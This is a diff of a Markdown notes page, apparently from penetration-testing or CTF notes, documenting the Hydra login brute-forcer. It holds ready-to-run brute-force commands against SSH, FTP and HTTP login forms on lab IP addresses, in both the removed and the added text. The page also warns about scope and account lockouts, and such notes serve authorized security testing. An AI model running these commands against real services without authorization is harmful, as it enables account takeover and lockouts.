@@ -1,37 +1,57 @@
-# Hyrdra
+# Hydra
 
-## Description
+Fast network login brute-forcer that supports many protocols.
+
+## When I Use It
+
+* Testing a login service for weak or reused credentials: SSH, FTP, RDP, SMB, HTTP forms
+* Spraying a known password across many usernames, or a wordlist against a known username
+* Confirming that a credential policy (lockout, rate limiting) actually works
+
+!!! warning "Noisy and can lock accounts"
+    Brute forcing generates heavy authentication traffic and can trigger account lockouts. Confirm it is in scope, watch thread counts, and prefer password spraying over per-account brute force where lockout is a risk.
 
 ## Installation
 
-## Usage
+Included in Kali. Elsewhere: `sudo apt install hydra`.
+
+## Common Commands
+
+| Flag | Meaning |
+| :--- | :--- |
+| `-l` / `-L` | Single username / username list |
+| `-p` / `-P` | Single password / password list |
+| `-t` | Parallel connections (lower is quieter) |
+| `-vV` | Verbose: show each attempt |
+| `-f` | Stop after the first valid login |
+
+```bash
+# SSH with a username and wordlist
+hydra -l mike -P /usr/share/wordlists/rockyou.txt -t 4 10.10.10.6 ssh
+
+# FTP
+hydra -l dale -P /usr/share/wordlists/rockyou.txt -t 4 -vV 10.10.10.6 ftp
+
+# HTTP POST login form: path:body:failure-string
+hydra -l molly -P rockyou.txt 10.10.10.6 \
+  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+```
+
+For the web form, `^USER^` and `^PASS^` are substituted from the lists, and `F=` is a string that appears on a failed login.
+
+## Reading the Output
+
+* A found credential is printed as `[port][service] host: ... login: ... password: ...`
+* Many services that appear vulnerable are rate-limited; if every attempt fails instantly, check whether the service is dropping the connections
+* Pair with [Wordlists](wordlists.md) chosen for the target
+
+## Related
+
+* [Wordlists](wordlists.md)
+* [Network Services Attacks](network-services-attacks.md)
+* [Password Cracking](../privilege-escalation/password-cracking.md)
 
 ## Resources
 
-`"hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"`
-
-hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.226.38 ftp
-
-[https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef](https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef)
-
-[https://attack.mitre.org/techniques/T1210/](https://attack.mitre.org/techniques/T1210/)
-
-[https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)
-
-[https://en.kali.tools/?p=220](https://en.kali.tools/?p=220)
-
-`hydra -l <username> -P <full path to pass> 10.10.248.5 -t 4 ssh`
-
-`-l = username` `-P = password list` `-t = number of threads`
-
-Web form: `hydra -l <username> -P <wordlist> 10.10.248.5 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
-
-SSH: `hydra -l <username> -P <full path to pass> 10.10.248.5 -t 4 ssh`
-
-hydra -l molly -P rockyou.txt 10.10.248.5 http-post-form "/login:username=^USER^\&password=^PASS^:F=incorrect" -V
-
-SecLists [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
-
-"hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.214.108 ssh"
-
-SECTION FUNCTION hydra Runs the hydra tool -t 16 Number of parallel connections per target -l \[user] Points to the user who's account you're trying to compromise -P \[path to dictionary] Points to the file containing the list of possible passwords -vV Sets verbose mode to very verbose, shows the login+pass combination for each attempt \[machine IP] The IP address of the target machine ssh / protocol Sets the protocol
+* [Hydra (Kali Tools)](https://www.kali.org/tools/hydra/)
+* [SecLists](https://github.com/danielmiessler/SecLists)
